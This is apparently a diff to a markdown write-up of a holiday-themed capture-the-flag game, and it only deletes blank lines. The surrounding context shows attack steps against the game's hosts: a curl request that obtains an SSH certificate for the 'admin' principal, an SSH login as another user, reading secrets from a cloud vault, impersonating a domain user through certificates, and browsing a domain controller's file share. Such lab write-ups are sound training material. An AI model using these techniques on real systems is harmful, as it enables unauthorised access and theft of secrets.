@@ -638,7 +638,6 @@ Output reformatted to JSON
     }
   }
 }
-
 ```
 
 What other users are on this server other than monitor?
@@ -671,7 +670,6 @@ After looking at Github code, it appears if you specify the principal it will us
  curl -X POST \
   -H "Content-Type: application/json" \
   -d '{"ssh_pub_key": "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQC0+n6OAfimJ6D0CL3Oa7D3J+qJhYtz2RgBnE6pqNgsa/SmrDGnRYzu47LKCS2gCS+Do4ND8wK49GmSoxq4M+YRRDIqtVqSql7xEXbol7vSN8bTM2bAOMrjhz9RU4i9QzrwxafRoLMfDShbhyBaUjeT+GKmnI4072VNdqHGVbimUXCj+chMMrP+nA3doAalajyrG8YQfv76PqruwEBXxE8n0GJoWFnP3QQBzHQGMInaE4d8x+IJG/8f4S5XTnQY0giBm9aAQ1CJcXWbwuEKS4HJH/GPEQu6WB0xSegUejJujoYnSIN6/kBqHdEi0wRpVmrN67T6DwrPAxT6jgNTPOP4U2c61QapkRpGXLR1usr8WF1UZ8gAjGJgGsyYQ3nb3fqmh8ARLQZE9DNyZXEjUSKhOf3SOzDlOEzKdMkzvXSzL/Cj2Qsj7CCEuRpf7dRQXJ3k0GJdvd7OGDjs6bOfdK4ewevaCQpj3WgV633jI7xFEOALuF+FZrb1vwwyyHi6IF0= admin@ssh-server-vm.santaworkshopgeeseislands.org", "principal": "admin"}' \  
-
 ```
 
 Create a public cert file to hold the value, in my case admin.pub
@@ -687,7 +685,6 @@ ssh -i admin.pub alabaster@ssh-server-vm.santaworkshopgeeseislands.org -i id_rsa
 Last login: Tue Dec 12 22:17:15 2023 from 206.83.30.183
 alabaster@ssh-server-vm:~$
 ```
-
 
 Let's check out his TODO list :) 
 
@@ -761,7 +758,6 @@ Output formatted in JSON
     }
   ]
 }
-
 ```
 
 Access secrets in the vault
@@ -789,7 +785,6 @@ Output
   ],
   "nextLink": null
 }
-
 ```
 
 Let's take a peek at that file
@@ -813,7 +808,6 @@ Output
   },
   "tags": {}
 }
-
 ```
 
 Storing the password for elfy in a variable to make it easier
@@ -864,7 +858,6 @@ Output
             "NORTHPOLE.LOCAL\\Domain Users",
             "NORTHPOLE.LOCAL\\Domain Users",
             "NORTHPOLE.LOCAL\\Domain Users",
-
 ```
 
 Let's generate a cert and priv key for wombleycube
@@ -912,7 +905,6 @@ Output
 ```
 [*] Enumerating computers ..
   1. npdc01$
-
 ```
 
  Let's connect to the domain controller with smbclient, it's the only computer in this domain so must be our fileshare
@@ -941,9 +933,6 @@ drw-rw-rw-          0  Tue Dec 12 02:14:05 2023 ..
 -rw-rw-rw-      54096  Tue Dec 12 02:14:08 2023 SignatureCookies.pdf
 drw-rw-rw-          0  Tue Dec 12 02:14:08 2023 super_secret_research
 -rw-rw-rw-        165  Tue Dec 12 02:14:08 2023 todo.txt
-
-
-
 ```
 
 Enter
@@ -1978,8 +1967,6 @@ We now know we need to fish right under the head of the goose on Steampunk islan
 ## Objective: Space Island Door Access Speaker
 
 You need to solve the Certificate SSHenanigans and Active Directory objectives before this as they provide key pieces. 
-
-
 
 In the Active Directory challenge we learned what we need to say into the speaker.
 
